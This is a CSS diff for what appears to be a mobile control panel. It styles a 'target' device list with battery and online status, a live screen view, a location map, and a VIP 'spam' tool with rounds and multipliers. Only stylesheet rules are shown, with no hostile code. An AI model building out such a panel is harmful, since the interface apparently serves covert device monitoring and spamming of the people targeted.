@@ -11,15 +11,7 @@
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 html,body{height:100%;overflow:hidden}
-body{
-  font-family:'Inter',system-ui,sans-serif;
-  background:#050304;color:var(--text);
-  -webkit-font-smoothing:antialiased;
-  -webkit-tap-highlight-color:transparent;
-  -webkit-touch-callout:none;
-  -webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;
-  overscroll-behavior:none;
-}
+body{font-family:'Inter',system-ui,sans-serif;background:#050304;color:var(--text);-webkit-font-smoothing:antialiased;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;overscroll-behavior:none}
 input,button,textarea,select{font-family:inherit;outline:none;border:none}
 button{cursor:pointer}
 a{color:inherit;text-decoration:none}
@@ -32,6 +24,7 @@ a{color:inherit;text-decoration:none}
   --error:#ff3333;--error-soft:rgba(255,51,51,0.12);
   --warning:#ffa502;--warning-soft:rgba(255,165,2,0.12);
   --info:#70a1ff;--info-soft:rgba(112,161,255,0.12);
+  --vip:#ffc107;--vip-dark:#ff9800;--vip-soft:rgba(255,193,7,0.12);--vip-glow:rgba(255,193,7,0.4);
   --radius-lg:22px;--radius:16px;--radius-sm:12px;
   --shadow-card:0 8px 24px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.04);
   --shadow-soft:0 4px 12px rgba(0,0,0,0.4);
@@ -44,15 +37,13 @@ body{background:radial-gradient(circle at 20% 10%, rgba(196,30,40,0.08) 0%, tran
 .app-shell{flex:1;position:relative;background:var(--bg-app);border-radius:24px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.04);display:flex;flex-direction:column}
 .screen{position:absolute;inset:0;display:flex;flex-direction:column;opacity:0;visibility:hidden;transition:opacity .3s ease,visibility .3s ease;overflow:hidden}
 .screen.active{opacity:1;visibility:visible}
-/* LOADING */
 #screen-loading{align-items:center;justify-content:center;padding:24px}
-#screen-loading .brand-logo{font-family:'Poppins',sans-serif;font-size:36px;font-weight:800;letter-spacing:-1.5px;background:linear-gradient(135deg,#f5f5f5 30%, #c41e28 90%);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:4px;filter:drop-shadow(0 4px 20px rgba(196,30,40,0.4))}
+#screen-loading .brand-logo{font-family:'Poppins',sans-serif;font-size:36px;font-weight:800;letter-spacing:-1.5px;background:linear-gradient(135deg,#f5f5f5 30%, #c41e28 90%);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:4px}
 #screen-loading .brand-sub{font-size:10px;letter-spacing:6px;color:var(--accent);text-transform:uppercase;margin-bottom:8px;font-weight:600}
 #screen-loading .brand-ver{font-size:9px;letter-spacing:3px;color:var(--text-mute);text-transform:uppercase;margin-bottom:36px;font-weight:600}
 .progress-wrap{width:100%;max-width:280px;height:5px;background:rgba(255,255,255,0.05);border-radius:3px;overflow:hidden}
 .progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#8b0000,#c41e28,#ff4757);border-radius:3px;transition:width .3s ease;box-shadow:0 0 12px var(--accent-glow)}
 #loading-text{margin-top:16px;font-size:11px;color:var(--text-dim);letter-spacing:.5px;min-height:16px;transition:opacity .2s ease}
-/* LOGIN */
 #screen-login{padding:0;justify-content:flex-start}
 .banner-wrap{position:relative;width:100%;height:44vh;min-height:260px;overflow:hidden;flex-shrink:0;background:#0a0607}
 .banner-wrap img{width:100%;height:100%;object-fit:cover;display:block;opacity:.95}
@@ -65,44 +56,40 @@ body{background:radial-gradient(circle at 20% 10%, rgba(196,30,40,0.08) 0%, tran
 .field{margin-bottom:14px}
 .field label{display:block;font-size:10px;font-weight:700;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px}
 .input-wrap{position:relative;display:flex;align-items:center}
-.input-wrap .ico-badge{position:absolute;left:8px;width:32px;height:32px;border-radius:9px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;pointer-events:none;transition:var(--trans);z-index:1}
+.input-wrap .ico-badge{position:absolute;left:8px;width:32px;height:32px;border-radius:9px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;pointer-events:none;z-index:1}
 .input-wrap .ico-badge i{font-size:13px;color:var(--accent-hover)}
-.input-wrap input,.input-wrap select,.input-wrap textarea{width:100%;background:var(--bg-app);border:1px solid var(--border);border-radius:var(--radius-sm);color:var(--text);padding:14px 14px 14px 50px;font-size:14px;font-weight:500;transition:var(--trans);box-shadow:var(--shadow-inner);-webkit-appearance:none;appearance:none}
+.input-wrap input,.input-wrap select,.input-wrap textarea{width:100%;background:var(--bg-app);border:1px solid var(--border);border-radius:var(--radius-sm);color:var(--text);padding:14px 14px 14px 50px;font-size:14px;font-weight:500;box-shadow:var(--shadow-inner);-webkit-appearance:none;appearance:none}
 .input-wrap input::placeholder,.input-wrap textarea::placeholder{color:var(--text-mute);font-weight:400}
 .input-wrap input:focus,.input-wrap select:focus,.input-wrap textarea:focus{border-color:var(--accent);background:var(--bg-card);box-shadow:0 0 0 3px var(--accent-soft)}
-.input-wrap select{background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%23a39599' stroke-width='3'><polyline points='6 9 12 15 18 9'/></svg>");background-repeat:no-repeat;background-position:right 16px center;padding-right:40px}
-.input-wrap textarea{resize:vertical;min-height:80px;font-family:inherit;padding:14px 14px 14px 50px;line-height:1.5}
+.input-wrap textarea{resize:vertical;min-height:80px;font-family:inherit;line-height:1.5}
 .btn{width:100%;padding:15px;border-radius:var(--radius-sm);font-size:13px;font-weight:700;letter-spacing:.5px;transition:var(--trans);display:inline-flex;align-items:center;justify-content:center;gap:8px;text-transform:uppercase}
 .btn-primary{background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;box-shadow:0 4px 16px var(--accent-glow), inset 0 1px 0 rgba(255,255,255,0.15)}
 .btn-primary:hover:not(:disabled){box-shadow:0 6px 24px var(--accent-glow);transform:translateY(-1px)}
+.btn-vip{background:linear-gradient(135deg,#ffc107,#ff9800);color:#1a1000;box-shadow:0 4px 16px var(--vip-glow), inset 0 1px 0 rgba(255,255,255,0.3)}
+.btn-vip:hover:not(:disabled){box-shadow:0 6px 24px var(--vip-glow);transform:translateY(-1px)}
 .btn:disabled{opacity:.5;cursor:not-allowed}
 .btn-ghost{background:var(--bg-card);color:var(--text);border:1px solid var(--border-hi);box-shadow:var(--shadow-soft)}
 .btn-ghost:hover:not(:disabled){background:var(--bg-elev);border-color:var(--accent)}
-.btn-danger{background:linear-gradient(135deg,#ff3333,#a51010);color:#fff;box-shadow:0 4px 16px rgba(255,51,51,0.3)}
+.btn-danger{background:linear-gradient(135deg,#ff3333,#a51010);color:#fff}
 .btn-sm{padding:9px 14px;font-size:11px;width:auto}
 .login-meta{margin-top:18px;text-align:center;font-size:11px;color:var(--text-mute)}
-#conn-dot{position:fixed;top:20px;right:20px;z-index:100;width:9px;height:9px;border-radius:50%;background:var(--success);box-shadow:0 0 10px var(--success);transition:var(--trans)}
+#conn-dot{position:fixed;top:20px;right:20px;z-index:100;width:9px;height:9px;border-radius:50%;background:var(--success);box-shadow:0 0 10px var(--success)}
 #conn-dot.warn{background:var(--warning);box-shadow:0 0 10px var(--warning)}
 #conn-dot.off{background:var(--error);box-shadow:0 0 10px var(--error)}
-/* OFFLINE POPUP */
 #offline-popup{position:fixed;inset:0;z-index:999;background:rgba(5,3,4,.95);backdrop-filter:blur(10px);display:flex;align-items:center;justify-content:center;padding:24px;opacity:0;visibility:hidden;transition:var(--trans)}
 #offline-popup.show{opacity:1;visibility:visible}
-.offline-box{width:100%;max-width:360px;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);padding:32px 24px;text-align:center;transform:translateY(10px) scale(.96);transition:transform .25s ease;box-shadow:0 20px 60px rgba(0,0,0,0.7)}
-#offline-popup.show .offline-box{transform:translateY(0) scale(1)}
+.offline-box{width:100%;max-width:360px;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);padding:32px 24px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.7)}
 .offline-icon-wrap{width:80px;height:80px;border-radius:50%;background:var(--error-soft);display:flex;align-items:center;justify-content:center;margin:0 auto 20px;animation:pulseOff 2s infinite}
 @keyframes pulseOff{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
 .offline-icon{font-size:34px;color:var(--error)}
-.offline-box h3{font-family:'Poppins',sans-serif;font-size:20px;font-weight:700;margin-bottom:10px;letter-spacing:.3px}
+.offline-box h3{font-family:'Poppins',sans-serif;font-size:20px;font-weight:700;margin-bottom:10px}
 .offline-box p{font-size:12px;color:var(--text-dim);line-height:1.7;margin-bottom:24px}
-/* DASHBOARD */
-.dash-header{position:sticky;top:0;z-index:10;display:flex;align-items:center;justify-content:space-between;padding:14px 16px;background:rgba(13,7,9,.85);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border-bottom:1px solid var(--border)}
-.hamburger{width:40px;height:40px;border-radius:12px;background:var(--bg-card);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;transition:var(--trans);color:var(--text);box-shadow:var(--shadow-soft)}
-.hamburger:active{transform:scale(.94)}
+.dash-header{position:sticky;top:0;z-index:10;display:flex;align-items:center;justify-content:space-between;padding:14px 16px;background:rgba(13,7,9,.85);backdrop-filter:blur(16px);border-bottom:1px solid var(--border)}
+.hamburger{width:40px;height:40px;border-radius:12px;background:var(--bg-card);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;color:var(--text);box-shadow:var(--shadow-soft)}
 .hamburger i{font-size:15px}
-.logo-text{font-family:'Poppins',sans-serif;font-size:16px;font-weight:700;letter-spacing:-.3px;background:linear-gradient(135deg,#fff 40%, var(--accent));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
-.page-title{font-family:'Poppins',sans-serif;font-size:15px;font-weight:700;color:var(--text);letter-spacing:.3px}
+.logo-text{font-family:'Poppins',sans-serif;font-size:16px;font-weight:700;background:linear-gradient(135deg,#fff 40%, var(--accent));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.page-title{font-family:'Poppins',sans-serif;font-size:15px;font-weight:700;color:var(--text)}
 .dash-body{padding:16px;display:flex;flex-direction:column;gap:14px;padding-bottom:28px;flex:1;overflow-y:auto}
-/* WELCOME BANNER */
 .welcome-banner{position:relative;border-radius:var(--radius-lg);overflow:hidden;height:150px;border:1px solid var(--border);box-shadow:var(--shadow-card)}
 .welcome-banner img{width:100%;height:100%;object-fit:cover;display:block}
 .welcome-banner::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(13,7,9,0.3) 0%, rgba(13,7,9,0.75) 100%)}
@@ -110,15 +97,16 @@ body{background:radial-gradient(circle at 20% 10%, rgba(196,30,40,0.08) 0%, tran
 .welcome-banner .wb-text .w{font-family:'Poppins',sans-serif;font-size:18px;font-weight:700;color:#fff;line-height:1.2}
 .welcome-banner .wb-text .s{font-size:11px;color:rgba(255,255,255,0.7);margin-top:4px}
 .welcome-banner .wb-badge{position:absolute;top:14px;right:14px;z-index:2;padding:5px 12px;border-radius:20px;background:rgba(196,30,40,0.9);color:#fff;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;box-shadow:0 4px 12px var(--accent-glow);backdrop-filter:blur(4px)}
-/* USER CARD */
+.welcome-banner .wb-badge.vip{background:linear-gradient(135deg,#ffc107,#ff9800);color:#1a1000;box-shadow:0 4px 12px var(--vip-glow)}
 .user-card{position:relative;border-radius:var(--radius-lg);overflow:hidden;background:var(--bg-card);border:1px solid var(--border);padding:20px;box-shadow:var(--shadow-card)}
 .user-card .content{display:flex;justify-content:space-between;align-items:flex-start;gap:12px}
 .user-card .label{font-size:10px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:4px}
-.user-card .usn{font-family:'Poppins',sans-serif;font-size:20px;font-weight:700;color:#fff;margin-bottom:10px;letter-spacing:-.3px}
-.user-card .role{display:inline-flex;align-items:center;gap:5px;font-size:10px;font-weight:700;padding:5px 12px;border-radius:20px;background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;text-transform:uppercase;letter-spacing:1px;box-shadow:0 2px 8px var(--accent-glow)}
+.user-card .usn{font-family:'Poppins',sans-serif;font-size:20px;font-weight:700;color:#fff;margin-bottom:10px}
+.user-card .role{display:inline-flex;align-items:center;gap:5px;font-size:10px;font-weight:700;padding:5px 12px;border-radius:20px;background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;text-transform:uppercase;letter-spacing:1px}
+.user-card .role.vip{background:linear-gradient(135deg,#ffc107,#ff9800);color:#1a1000}
+.user-card .role.reseller{background:linear-gradient(135deg,#2ed573,#1a9e4f)}
 .user-card .val{font-size:13px;font-weight:700;margin-top:4px;text-align:right;color:var(--text)}
 .user-card .val.mono{font-family:'JetBrains Mono',monospace;font-size:11px}
-/* MINI GRID */
 .mini-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
 .mini-card{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:14px;display:flex;align-items:center;gap:12px;box-shadow:var(--shadow-card)}
 .mini-card .ico-badge{width:40px;height:40px;border-radius:12px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;flex-shrink:0}
@@ -126,18 +114,14 @@ body{background:radial-gradient(circle at 20% 10%, rgba(196,30,40,0.08) 0%, tran
 .mini-card .info{flex:1;min-width:0}
 .mini-card .label{font-size:9px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.2px;font-weight:700;margin-bottom:3px}
 .mini-card .val{font-size:13px;font-weight:700;color:var(--text);word-break:break-all}
-/* ANNOUNCEMENT */
-.announce-card{position:relative;border-radius:var(--radius-lg);overflow:hidden;border:1px solid var(--border);box-shadow:var(--shadow-card);cursor:pointer;transition:var(--trans);min-height:110px;background:var(--bg-card)}
-.announce-card:hover{border-color:var(--accent);transform:translateY(-1px)}
+.announce-card{position:relative;border-radius:var(--radius-lg);overflow:hidden;border:1px solid var(--border);box-shadow:var(--shadow-card);cursor:pointer;min-height:110px;background:var(--bg-card)}
 .announce-card img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;opacity:.4}
 .announce-card .ac-body{position:relative;z-index:2;padding:18px;display:flex;flex-direction:column;justify-content:flex-end;min-height:110px}
 .announce-card .ac-body .ac-label{font-size:9px;font-weight:700;color:var(--accent);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:6px;display:flex;align-items:center;gap:6px}
 .announce-card .ac-body .ac-title{font-family:'Poppins',sans-serif;font-size:15px;font-weight:700;color:#fff;line-height:1.3;margin-bottom:4px}
 .announce-card .ac-body .ac-desc{font-size:11px;color:rgba(255,255,255,0.7);line-height:1.4;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
-/* TARGET LIST */
 .target-list{display:flex;flex-direction:column;gap:10px}
-.target-item{display:flex;align-items:center;gap:12px;padding:14px;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);cursor:pointer;transition:var(--trans);box-shadow:var(--shadow-card)}
-.target-item:hover{border-color:var(--accent);background:var(--bg-elev);transform:translateY(-1px)}
+.target-item{display:flex;align-items:center;gap:12px;padding:14px;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);cursor:pointer;box-shadow:var(--shadow-card)}
 .target-item .ti-avatar{width:44px;height:44px;border-radius:12px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;flex-shrink:0}
 .target-item .ti-avatar i{font-size:18px;color:var(--accent-hover)}
 .target-item .ti-info{flex:1;min-width:0}
@@ -145,60 +129,192 @@ body{background:radial-gradient(circle at 20% 10%, rgba(196,30,40,0.08) 0%, tran
 .target-item .ti-info .d{font-size:11px;color:var(--text-dim);margin-top:2px;display:flex;gap:8px;flex-wrap:wrap;align-items:center}
 .target-item .ti-info .d .battery-badge{display:inline-flex;align-items:center;gap:4px;padding:2px 7px;border-radius:6px;background:var(--success-soft);color:var(--success);font-size:10px;font-weight:700}
 .target-item .ti-info .d .battery-badge.low{background:var(--error-soft);color:var(--error)}
-.target-item .ti-status{flex-shrink:0;display:flex;align-items:center;gap:6px;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px}
+.target-item .ti-status{flex-shrink:0;display:flex;align-items:center;gap:6px;font-size:10px;font-weight:700;text-transform:uppercase}
 .target-item .ti-status.on{color:var(--success)}
 .target-item .ti-status.off{color:var(--text-mute)}
 .target-item .ti-status .d{width:8px;height:8px;border-radius:50%;background:currentColor;box-shadow:0 0 8px currentColor}
-/* TABS */
 .tabs{display:flex;gap:6px;background:var(--bg-app);border:1px solid var(--border);border-radius:14px;padding:5px;margin-bottom:14px}
-.tabs button{flex:1;padding:10px;border-radius:10px;font-size:11px;font-weight:700;color:var(--text-dim);background:transparent;transition:var(--trans);display:flex;align-items:center;justify-content:center;gap:6px;letter-spacing:.3px;text-transform:uppercase}
+.tabs button{flex:1;padding:10px;border-radius:10px;font-size:11px;font-weight:700;color:var(--text-dim);background:transparent;display:flex;align-items:center;justify-content:center;gap:6px;text-transform:uppercase}
 .tabs button.active{background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;box-shadow:0 4px 12px var(--accent-glow)}
 .tab-panel{display:none}
 .tab-panel.active{display:block}
-/* LIVE VIEW */
-.live-view{position:relative;width:100%;aspect-ratio:9/16;max-height:500px;background:#000;border-radius:12px;overflow:hidden;border:1px solid var(--border)}
-.live-view img{width:100%;height:100%;object-fit:contain;display:block}
-.live-view .empty{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;color:var(--text-mute);font-size:12px;text-align:center;padding:20px}
-.live-view .empty i{font-size:42px;margin-bottom:10px;opacity:.4}
-.live-view .live-badge{position:absolute;top:10px;left:10px;z-index:2;padding:4px 10px;border-radius:20px;background:rgba(255,51,51,0.9);color:#fff;font-size:9px;font-weight:700;letter-spacing:1px;display:flex;align-items:center;gap:5px;box-shadow:0 0 12px rgba(255,51,51,0.6)}
-.live-view .live-badge .d{width:6px;height:6px;border-radius:50%;background:#fff;animation:pulseDot 1.2s infinite}
-@keyframes pulseDot{0%,100%{opacity:1}50%{opacity:.3}}
-/* LOCATE */
-.loc-map{width:100%;height:280px;background:#000;border-radius:12px;overflow:hidden;border:1px solid var(--border);position:relative}
-.loc-map iframe{width:100%;height:100%;border:0;display:block}
-.loc-map .empty{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;color:var(--text-mute);font-size:12px;text-align:center;padding:20px}
-.loc-map .empty i{font-size:42px;margin-bottom:10px;opacity:.4}
-.loc-coords{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text-dim);margin-top:10px;text-align:center;letter-spacing:.5px}
-/* TOGGLE */
 .toggle-row{display:flex;align-items:center;justify-content:space-between;padding:14px;background:var(--bg-app);border:1px solid var(--border);border-radius:var(--radius-sm);margin-bottom:10px}
-.toggle-row:last-child{margin-bottom:0}
 .toggle-row .tr-left{display:flex;align-items:center;gap:12px;flex:1}
-.toggle-row .tr-left .ico-badge{width:38px;height:38px;border-radius:11px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.toggle-row .tr-left .ico-badge{width:38px;height:38px;border-radius:11px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center}
 .toggle-row .tr-left .ico-badge i{font-size:15px;color:var(--accent-hover)}
 .toggle-row .tr-left .tr-info .n{font-family:'Poppins',sans-serif;font-size:13px;font-weight:700;color:var(--text)}
 .toggle-row .tr-left .tr-info .d{font-size:10px;color:var(--text-dim);margin-top:2px}
 .switch{position:relative;width:48px;height:26px;flex-shrink:0}
 .switch input{opacity:0;width:0;height:0}
-.switch .slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background:var(--bg-card);border:1px solid var(--border);border-radius:26px;transition:var(--trans)}
+.switch .slider{position:absolute;cursor:pointer;inset:0;background:var(--bg-card);border:1px solid var(--border);border-radius:26px;transition:var(--trans)}
 .switch .slider:before{content:'';position:absolute;height:18px;width:18px;left:3px;bottom:2.5px;background:var(--text-dim);border-radius:50%;transition:var(--trans)}
 .switch input:checked + .slider{background:linear-gradient(135deg,#c41e28,#8b0000);border-color:var(--accent)}
 .switch input:checked + .slider:before{transform:translateX(22px);background:#fff}
-/* TOOLS */
-.upload-zone{border:2px dashed var(--border-hi);border-radius:var(--radius-lg);padding:40px 24px;text-align:center;cursor:pointer;transition:var(--trans);background:var(--bg-card);position:relative;overflow:hidden}
-.upload-zone:hover,.upload-zone.dragover{border-color:var(--accent);background:var(--bg-elev)}
+.live-view{position:relative;width:100%;aspect-ratio:9/16;max-height:500px;background:#000;border-radius:12px;overflow:hidden;border:1px solid var(--border)}
+.live-view img{width:100%;height:100%;object-fit:contain;display:block}
+.live-view .empty{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;color:var(--text-mute);font-size:12px;text-align:center;padding:20px}
+.live-view .empty i{font-size:42px;margin-bottom:10px;opacity:.4}
+.live-view .live-badge{position:absolute;top:10px;left:10px;z-index:2;padding:4px 10px;border-radius:20px;background:rgba(255,51,51,0.9);color:#fff;font-size:9px;font-weight:700;display:flex;align-items:center;gap:5px}
+.live-view .live-badge .d{width:6px;height:6px;border-radius:50%;background:#fff;animation:pulseDot 1.2s infinite}
+@keyframes pulseDot{0%,100%{opacity:1}50%{opacity:.3}}
+.loc-map{width:100%;height:280px;background:#000;border-radius:12px;overflow:hidden;border:1px solid var(--border);position:relative}
+.loc-map iframe{width:100%;height:100%;border:0;display:block}
+.loc-map .empty{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;color:var(--text-mute);font-size:12px;text-align:center;padding:20px}
+.loc-map .empty i{font-size:42px;margin-bottom:10px;opacity:.4}
+.loc-coords{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text-dim);margin-top:10px;text-align:center}
+#sidebar{position:fixed;top:0;left:0;bottom:0;width:280px;max-width:82vw;background:var(--bg-app);border-right:1px solid var(--border);z-index:200;transform:translateX(-100%);transition:transform .3s cubic-bezier(0.4,0,0.2,1);display:flex;flex-direction:column;overflow-y:auto;box-shadow:20px 0 60px rgba(0,0,0,0.6)}
+#sidebar.open{transform:translateX(0)}
+#sidebar-backdrop{position:fixed;inset:0;background:rgba(5,3,4,.75);backdrop-filter:blur(4px);z-index:199;opacity:0;visibility:hidden;transition:var(--trans)}
+#sidebar-backdrop.show{opacity:1;visibility:visible}
+.sb-head{padding:28px 22px 20px;border-bottom:1px solid var(--border)}
+.sb-head .brand{font-family:'Poppins',sans-serif;font-size:20px;font-weight:800;background:linear-gradient(135deg,#fff 40%, var(--accent));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.sb-head .sub{font-size:10px;color:var(--text-dim);margin-top:4px;letter-spacing:2px;text-transform:uppercase}
+.sb-nav{padding:14px 12px;display:flex;flex-direction:column;gap:4px}
+.sb-item{padding:13px 14px;border-radius:12px;display:flex;align-items:center;gap:14px;font-size:14px;font-weight:600;color:var(--text-dim);cursor:pointer;position:relative}
+.sb-item:hover{background:var(--bg-card);color:var(--text)}
+.sb-item.active{background:var(--accent-soft);color:var(--accent-hover)}
+.sb-item.active::before{content:'';position:absolute;left:0;top:20%;bottom:20%;width:3px;background:var(--accent);border-radius:3px}
+.sb-item .ico-badge{width:32px;height:32px;border-radius:9px;background:rgba(255,255,255,0.03);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.sb-item.active .ico-badge{background:var(--accent-soft)}
+.sb-item .ico-badge i{font-size:14px;color:currentColor}
+.sb-sep{height:1px;background:var(--border);margin:10px 16px}
+.sb-label{font-size:10px;color:var(--text-mute);text-transform:uppercase;letter-spacing:2px;padding:12px 16px 6px;font-weight:700}
+.section{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);padding:20px;box-shadow:var(--shadow-card)}
+.section h3{font-family:'Poppins',sans-serif;font-size:14px;font-weight:700;margin-bottom:16px;display:flex;align-items:center;gap:12px}
+.section h3 .ico-badge{width:32px;height:32px;border-radius:9px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center}
+.section h3 .ico-badge i{font-size:13px;color:var(--accent-hover)}
+.tools-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.tool-card{position:relative;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:16px 14px;display:flex;flex-direction:column;align-items:flex-start;gap:10px;cursor:pointer;box-shadow:var(--shadow-card);overflow:hidden}
+.tool-card .tc-icon{width:44px;height:44px;border-radius:12px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center}
+.tool-card .tc-icon i{font-size:18px;color:var(--accent-hover)}
+.tool-card .tc-name{font-family:'Poppins',sans-serif;font-size:13px;font-weight:700;color:var(--text);line-height:1.2}
+.tool-card .tc-desc{font-size:10px;color:var(--text-dim);line-height:1.4}
+.tool-card.vip{border-color:var(--vip);background:linear-gradient(135deg, rgba(255,193,7,0.08), rgba(255,152,0,0.04))}
+.tool-card.vip .tc-icon{background:var(--vip-soft)}
+.tool-card.vip .tc-icon i{color:var(--vip)}
+.tool-card .tc-badge{position:absolute;top:10px;right:10px;padding:3px 8px;border-radius:6px;font-size:9px;font-weight:700;letter-spacing:.5px;text-transform:uppercase}
+.tool-card .tc-badge.vip-badge{background:linear-gradient(135deg,#ffc107,#ff9800);color:#1a1000;box-shadow:0 0 12px var(--vip-glow)}
+.tool-card.locked{opacity:.6;cursor:not-allowed}
+.vip-section{margin-top:20px}
+.vip-header{display:flex;align-items:center;gap:10px;margin-bottom:14px;padding:0 4px}
+.vip-header .vh-icon{width:32px;height:32px;border-radius:9px;background:linear-gradient(135deg,#ffc107,#ff9800);display:flex;align-items:center;justify-content:center;box-shadow:0 0 16px var(--vip-glow)}
+.vip-header .vh-icon i{font-size:14px;color:#1a1000}
+.vip-header .vh-text .n{font-family:'Poppins',sans-serif;font-size:14px;font-weight:700;color:var(--vip)}
+.vip-header .vh-text .d{font-size:10px;color:var(--text-dim)}
+.rondes-box{background:var(--bg-app);border:1px solid var(--border);border-radius:var(--radius);padding:18px;margin-bottom:14px}
+.rondes-box .rb-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
+.rondes-box .rb-head .t{font-family:'Poppins',sans-serif;font-size:13px;font-weight:700;color:var(--text);display:flex;align-items:center;gap:8px}
+.rondes-box .rb-head .badge{padding:4px 10px;border-radius:20px;background:var(--vip-soft);color:var(--vip);font-size:10px;font-weight:700}
+.rondes-input{display:flex;align-items:center;gap:10px;margin-bottom:14px}
+.rondes-input .rb-btn{width:52px;height:52px;border-radius:14px;background:var(--bg-card);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:22px;color:var(--text);font-weight:700}
+.rondes-input .rb-val{flex:1;height:52px;background:var(--bg-card);border:1px solid var(--border);border-radius:14px;display:flex;align-items:center;justify-content:center;font-family:'Poppins',sans-serif;font-size:24px;font-weight:700;color:var(--text)}
+.rondes-input .rb-x{font-size:14px;color:var(--text-dim);font-weight:600;padding:0 4px}
+.multiplier-grid{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:14px}
+.multiplier-grid .m-btn{padding:10px 16px;border-radius:12px;background:var(--bg-card);border:1px solid var(--border);font-size:13px;font-weight:700;color:var(--text-dim);cursor:pointer}
+.multiplier-grid .m-btn.active{background:linear-gradient(135deg,#ffc107,#ff9800);color:#1a1000;border-color:var(--vip);box-shadow:0 4px 12px var(--vip-glow)}
+.rondes-info{font-size:11px;color:var(--text-dim);line-height:1.6;text-align:center;padding:10px;background:var(--bg-app);border-radius:10px}
+.rondes-info b{color:var(--vip)}
+.spam-actions{display:grid;grid-template-columns:2fr 1fr;gap:10px;margin-bottom:14px}
+.spam-actions .btn-start{padding:18px;border-radius:14px;background:linear-gradient(135deg,#ffc107,#ff9800);color:#1a1000;font-size:13px;font-weight:800;letter-spacing:.5px;text-transform:uppercase;box-shadow:0 4px 16px var(--vip-glow);border:none;display:flex;align-items:center;justify-content:center;gap:8px}
+.spam-actions .btn-start:disabled{opacity:.5;cursor:not-allowed}
+.spam-actions .btn-start.stop{background:linear-gradient(135deg,#ff3333,#a51010);color:#fff}
+.spam-actions .btn-reset{padding:18px;border-radius:14px;background:var(--bg-card);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:18px;color:var(--text-dim)}
+.progress-card{background:var(--bg-app);border:1px solid var(--border);border-radius:var(--radius);padding:18px;margin-bottom:14px}
+.progress-card .pc-head{display:flex;align-items:center;gap:12px;margin-bottom:14px}
+.progress-card .pc-head .icon-wrap{width:38px;height:38px;border-radius:11px;background:var(--vip-soft);display:flex;align-items:center;justify-content:center}
+.progress-card .pc-head .icon-wrap i{font-size:15px;color:var(--vip);animation:spin 2s linear infinite}
+@keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
+.progress-card .pc-head .info{flex:1;min-width:0}
+.progress-card .pc-head .info .l{font-size:10px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-bottom:2px}
+.progress-card .pc-head .info .v{font-family:'Poppins',sans-serif;font-size:13px;font-weight:700;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.progress-card .pc-head .pct{padding:5px 10px;border-radius:20px;background:var(--vip-soft);color:var(--vip);font-size:11px;font-weight:700}
+.progress-bar{width:100%;height:6px;background:var(--bg-card);border-radius:3px;overflow:hidden;margin-bottom:16px}
